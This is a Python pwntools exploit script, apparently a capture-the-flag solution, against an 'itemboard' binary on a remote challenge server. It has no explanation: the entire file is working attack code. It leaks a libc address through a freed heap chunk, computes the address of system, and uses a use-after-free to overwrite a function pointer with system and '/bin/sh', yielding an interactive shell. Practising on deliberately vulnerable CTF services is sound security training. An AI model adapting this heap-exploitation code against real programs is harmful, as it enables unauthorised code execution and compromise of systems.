# coding:utf-8
from pwn import *

local = 0

if local:
    sh = process('./itemboard')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    offset = 0x3c4b20
else:
    sh = remote('pwn2.jarvisoj.com', '9887')
    libc = ELF('./libc-2.19.so')
    offset = 0x3c2760

elf = ELF('./itemboard')

def Add(name, len, conts):
    sh.recvuntil('choose:\n')
    sh.sendline('1')
    sh.recvuntil('Item name?\n')
    sh.sendline(name)
    sh.recvuntil("Description's len?\n")
    sh.sendline(str(len))
    sh.recvuntil('Description?\n')
    sh.sendline(conts)

def List():
    sh.recvuntil('choose:\n')
    sh.sendline('2')

def Show(num):
    sh.recvuntil('choose:\n')
    sh.sendline('3')
    sh.recvuntil('Which item?\n')
    sh.sendline(str(num))

def Remove(num):
    sh.recvuntil('choose:\n')
    sh.sendline('4')
    sh.recvuntil('Which item?\n')
    sh.sendline(str(num))

# Libc地址 + system地址
Add('1', 0x80, 'a' * 8)
Add('2', 0x80, 'b' * 8)
Remove(0)
Show(0)

sh.recvuntil('Description:')
leak_addr = u64(sh.recv(6).ljust(8, '\x00'))

libc_addr = leak_addr - 88 - offset
sys_addr = libc_addr + libc.symbols['system']

# UAF get shell
Add('cccc', 32, 'cccc')
Add('dddd', 32, 'dddd')
Remove(2)
Remove(3)

Add('eeee', 24, '/bin/sh;' + 'eeeeeeee' + p64(sys_addr))
Remove(2)

sh.interactive()
sh.close()